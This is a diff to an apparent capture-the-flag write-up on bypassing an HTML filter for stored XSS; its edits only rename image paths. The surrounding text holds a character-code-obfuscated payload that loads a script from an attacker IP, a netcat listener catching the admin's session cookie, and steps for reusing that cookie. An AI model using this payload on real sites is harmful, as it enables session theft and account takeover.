@@ -126,7 +126,7 @@ The filtering removed most of the text, but what’s interesting is how the imag
 
 There are three rules we can learn from this: Image HTML tags themselves are not filtered like other tags, the ‘src=/’ part remains when there are quotes before the end of the tag, and anything in quotes after the first ‘/’ and before the tag closes (>) is removed. Now let’s see what happens if we take into account these rules but have our script tags between the HTML image tags by trying ``<img src=/"><script>test</script> </img>``.
 
-![img](assets/third_test.png)
+![img](assets/thid_test.png)
 
 Now we can see that the filtering is still applied on content between the image tags. Since everything after the first ‘/’ is removed, let’s put the first quote before the ‘/’ then close the image tag again after the script tags and final quote mark. This should work as the tag is not considered closed until the last ‘/>’.  Our next input therefore will be ``<img src="/><script>test</script>" />``
 
@@ -170,11 +170,11 @@ Then we start our netcat listener to listen on the port we scripted the data to 
 ```
 <img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,54,49,47,115,101,115,115,105,111,110,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>" />
 ```
-![img](assets/note_payload)
+![img](assets/note_payload.png)
 
 Now it’s a case of waiting and watching our netcat listener for our session data. If everything works correctly the session cookie data should be sent to the output of our netcat listener as shown below.
 
-![img](assets/listener_cookie)
+![img](assets/listener_cookie.png)
 
 We can use this cookie as our own to spoof the admin user, the example below shows this being done using the dev tools built into firefox. The cookie name remains the same but the value should be replaced with the exact cookie that was intercepted on our listener.
 
